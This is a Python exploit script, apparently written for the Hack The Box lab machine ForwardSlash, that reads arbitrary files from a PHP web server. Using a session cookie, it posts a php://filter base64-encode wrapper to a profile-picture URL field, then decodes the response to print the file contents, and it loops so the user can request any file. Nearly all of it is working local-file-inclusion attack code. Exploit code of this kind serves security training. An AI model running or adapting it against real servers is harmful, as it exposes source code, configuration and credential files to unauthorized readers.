#!/usr/bin/python3
from base64 import b64decode
import requests
import os

def printBanner():
    print("""
 _____  _____        ___ __ __ ______ ____   ____    __ ______  ___  ____  
 |     |/ ___/       /  _]  |  |      |    \ /    |  /  ]      |/   \|    \ 
 |   __(   \_ _____ /  [_|  |  |      |  D  )  o  | /  /|      |     |  D  )
 |  |_  \__  |     |    _]_   _|_|  |_|    /|     |/  / |_|  |_|  O  |    / 
 |   _] /  \ |_____|   [_|     | |  | |    \|  _  /   \_  |  | |     |    \ 
 |  |   \    |     |     |  |  | |  | |  .  \  |  \     | |  | |     |  .  \\
 |__|    \___|     |_____|__|__| |__| |__|\_|__|__|\____| |__|  \___/|__|\_|
                      ForwardSlash File Extractor 
                                        By Gremlin ~ Just for fun.
""")


class Target:
    #Variables
    targetLink = "http://backup.forwardslash.htb/profilepicture.php" 
    #Constructors
    def __init__(self, cookie):
        #printBanner()
        self.cookie = cookie
    
    #Functions
    def printPayload(self, payload):
        print(self.cookie)
        print(f"Using Cookie : {self.cookieSessID}")
        print(f"Target : {self.targetLink}")
        print(f"Payload : {payload}")

    def sendPayload(self, payload):
        self.cookieSessID = {"PHPSESSID" : self.cookie}
        self.printPayload(payload)
        rePayload = {"url" : "php://filter/convert.base64-encode/resource=" + payload}
        re = requests.post(self.targetLink, cookies=self.cookieSessID, data=rePayload)
        response = re.text
        indexToDelete = response.find("</html>")
        htmlBadTag = "</html>"
        response = response[indexToDelete:]
        splitResponse = response.split()
        aResponse = [html for html in splitResponse if html not in htmlBadTag]
        finalResponse = ' '.join(aResponse)
        #print(finalResponse)
        print(b64decode(finalResponse).decode('utf-8'))
        #res = str(b64decode(finalResponse))
        #print(res)

#MAIN FUNCTION
def main():
    try:
        os.system("clear")
        printBanner()
        if not os.path.isfile("cookie.txt"):
            cookie = input("Please enter your cookie : ")
            Worker = Target(cookie)
        else:
            with open("cookie.txt", "r") as cookieFile:
                cookie = cookieFile.readline()
                cookie = cookie.rstrip()
                print(f"[+] Cookie : {cookie}")
                while True:
                    rightCookie = input("[!] Is this your current cookie for the session on forward slash (y/n) ? : ")
                    if rightCookie.lower() == "y" or rightCookie.lower() == "yes":
                        Worker = Target(cookie)
                        break;
                    elif rightCookie.lower() == "n" or rightCookie.lower() == "n":
                        cookie = input("[+] What is your current cookie for the website :")
                        Worker = Target(cookie)
                        break;
                    else:
                        print("[!] Please enter a valid value !!!")
        while True:
            payload = input("Enter the file you would like to extract : ")
            Worker.sendPayload(payload)
    except KeyboardInterrupt:
        print("\n[!] Program Interruption detected, stopping exploitation...")
main()
